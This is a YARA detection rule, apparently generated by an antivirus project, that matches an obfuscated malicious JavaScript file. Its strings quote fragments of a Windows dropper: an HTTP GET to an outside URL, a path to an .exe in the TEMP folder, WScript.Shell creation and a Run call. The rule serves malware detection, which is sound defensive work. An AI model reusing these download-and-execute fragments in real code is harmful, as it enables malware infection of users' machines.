rule sig_20160401_904a04bebd5a5d35e382a08527f24754 {
  meta:
    description = "datamaliciousorder - file 20160401_904a04bebd5a5d35e382a08527f24754.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c7173c1b67d2ba079d26f81ba557303707f2b0f64d5ef80d7f5390c9935bf012"

  strings:
    $s1  = "PwNjk[WgUbv](\"G\" + \"ET\", \"http://ecomputercenter.com/d9sla\", false);" fullword ascii
    $s2  = "function HidYz(ZlHcy, QrEu){GnuIm = GnuIm * 1; return ZlHcy - QrEu;};" fullword ascii
    $s3  = "var ZunCvs = function BgDyk() {return WScript[UoBkr](\"WScript\"+\".Shell\");}(), ElRh = 11;" fullword ascii
    $s4  = "if (PwNjk[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function EmLq(){return SokKuy + \"\";};" fullword ascii
    $s6  = "function HmOl() {return ZunCvs[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"eAJtFAXS1z.ex\" + \"e\";};" fullword ascii
    $s7  = "function IjnDu() {return ((NsnTl == true) && (NsnTl == PybHcb)) ? 1 : GnuIm;};" fullword ascii
    $s8  = "function VzZv(JpGbv) {var JxxWof = (1, 2, 3, 4, 5, JpGbv); return JxxWof;};" fullword ascii
    $s9  = "var PybHcb = false;" fullword ascii
    $s10 = "PybHcb = true; " fullword ascii
    $s11 = "function SbXl(){return 23;};" fullword ascii
    $s12 = "NsnTl = true; " fullword ascii
    $s13 = "var NsnTl = false;" fullword ascii
    $s14 = "var XjSc = false;" fullword ascii
    $s15 = "return HidYz(PwDd, HvbQrp);" fullword ascii
    $s16 = "function RduDht(){return UoBkr;};" fullword ascii
    $s17 = "function UjRrx()" fullword ascii
    $s18 = "var ZckEt = new this[\"Date\"]();" fullword ascii
    $s19 = "function TbwDno(DauTg){ZunCvs[\"R\"+\"un\"](DauTg, GnuIm, GnuIm);};" fullword ascii
    $s20 = "}while (JekKt);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}